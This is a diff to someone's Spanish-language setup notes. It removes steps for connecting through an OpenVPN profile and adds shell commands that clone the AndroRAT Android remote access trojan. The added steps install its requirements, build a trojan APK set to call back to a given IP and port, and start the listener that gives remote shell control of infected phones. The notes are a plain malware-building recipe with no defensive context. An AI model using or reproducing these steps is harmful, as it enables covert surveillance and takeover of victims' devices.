@@ -69,37 +69,16 @@ entrar en la ip local de la maquina:( http://<SERVER IP>:22533)
 
 ```
 
----------------
-# Hacer  Conexion Remota
-
-## Instalacion de OPEN VPN
-
 ```shell
-sudo apt update
-# instalamos
-sudo apt install openvpn
+sudo apt install python3-pip
+pip install colorama
+git clone https://github.com/karma9874/AndroRAT.git
+cd /home/cesar/AndroRAT
+# instalamos los requerimientos
+pip install -r requirements.txt
 
-# descargamso la configuracion
-# ubicamos en descargas y ponemos ahi el archivo de configuracion
-cd /home/cesar/Downloads/
-  # ahi pondremos el archivo => cesarauris.lemon.ovpn
-  
-# ahora ponemos el comando
-sudo openvpn --config cesarauris.lemon.ovpn
+# generar el apk 
+python3 androRAT.py --build -i 192.168.0.70 -p 8000 -o androrat.apk
+# ponernos a escuchar en 
+sudo python3 androRAT.py --shell -i 192.168.0.70 -p 8000
 ```
-![](https://i.imgur.com/d1fED8u.png) 
-
-### ahora verificamos q estamos en la vpn que es publico
-
-![](https://i.imgur.com/qhBgB1G.png) 
-
-
-# Ahora configurar Lemon con nueva config
-
-![](https://i.imgur.com/uokhAQG.png) 
-
-ahora contruimos el apk builder
-
-![](https://i.imgur.com/LW6lLiX.png) 
-
-
